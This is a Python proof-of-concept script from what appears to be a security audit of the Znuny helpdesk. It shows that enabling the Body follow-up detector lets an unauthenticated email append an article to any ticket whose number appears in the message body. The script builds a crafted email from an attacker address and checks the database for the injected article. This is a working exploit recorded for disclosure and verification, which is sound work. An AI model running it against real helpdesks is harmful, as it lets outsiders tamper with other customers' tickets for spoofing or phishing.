#!/usr/bin/env python3
r"""
VULN-031 — Extra PostMaster follow-up detectors broaden the unauth arbitrary-ticket injection
=============================================================================================
Vulnerable code : targets/Znuny/Kernel/System/PostMaster/FollowUpCheck/Body.pm:46 (GetTNByString on body)
                  (siblings RawEmail.pm, Attachments.pm, ExternalTicketNumberRecognition.pm)
                  registrations Ticket.xml:12478-12513 (all Valid=0)
Vulnerability   : CWE-862 — same missing-sender-authz as VULN-006, ticket# may match anywhere

Enabling any of the extra follow-up matchers (Body/RawEmail/Attachments/ExtTNR) lets the ticket
number match anywhere in the body / raw message / an attachment — removing VULN-006's last
constraint (needing to control the [Ticket#…] subject). Same unauth defect class.

Proof: enable the Body detector; send an unauthenticated email whose subject does NOT reference the
ticket but whose BODY mentions the victim ticket number → the attacker's article is still appended.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

SETTING = "PostMaster::CheckFollowUpModule###0300-Body"

def main():
    C.banner("VULN-031", "Extra follow-up detectors broaden unauth arbitrary-ticket injection",
             ["FollowUpCheck/Body.pm:46 matches the ticket number anywhere in the body (Valid=0 by default)"])
    sfx = C.rid()
    C.log("SETUP", f"enabling {SETTING} (ships Valid=0)")
    C.console("Admin::Config::Update", "--setting-name", SETTING, "--valid", "1")
    vtid, vtn = C.create_ticket(f"victim body-followup {sfx}", "Raw", body="legit",
                                customer_id=f"lg{sfx}", customer_user=f"lg{sfx}", state="closed successful")
    before = C.db(f"SELECT COUNT(*) FROM article WHERE ticket_id={vtid}")[0][0]
    C.log("SETUP", f"victim ticket TID={vtid} TN={vtn}, {before} article(s)")

    marker = f"BODY-FOLLOWUP-{sfx}"
    raw = (
        f"From: attacker_{sfx}@evil.example\r\n"
        "To: support@localhost\r\n"
        f"Subject: your invoice {sfx}\r\n"                # NO [Ticket#...] in the subject
        f"Message-ID: <atkbody-{sfx}@evil.example>\r\n"
        "Date: Tue, 29 Sep 2026 12:30:00 +0000\r\n"
        "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n"
        "\r\n"
        f"{marker}. Following up, ref Ticket#{vtn} from last week.\r\n")  # ticket number only in the body (hook format)
    C.log("STEP", f"unauth email with the ticket number ONLY in the body (subject unrelated)")
    C.postmaster_read(raw, untrusted=True)

    rows = C.db("SELECT amd.a_body FROM article a JOIN article_data_mime amd ON amd.article_id=a.id "
                f"WHERE a.ticket_id={vtid} AND amd.a_body LIKE '%{marker}%'")
    after = C.db(f"SELECT COUNT(*) FROM article WHERE ticket_id={vtid}")[0][0]
    C.log("PROOF", f"body-matched injected article on victim: {bool(rows)} (count {before}->{after})")
    open(os.path.join(HERE, "request.http"), "w").write("(raw email piped to Maint::PostMaster::Read --untrusted)\n\n" + raw)
    open(os.path.join(HERE, "response.txt"), "w").write(f"injected via body match: {rows}\ncount {before}->{after}\n")

    try: C.sysconfig_reset(SETTING)
    except Exception: pass

    if rows:
        C.confirmed(f"with the Body follow-up detector enabled, an unauthenticated email whose "
                    f"subject does NOT reference the ticket still injected an article into victim "
                    f"ticket {vtid} by mentioning its number in the body — the extra detectors remove "
                    "the subject-tag constraint on VULN-006.")
    else:
        C.failed(f"no body-matched article on victim ticket {vtid}")

if __name__ == "__main__":
    main()
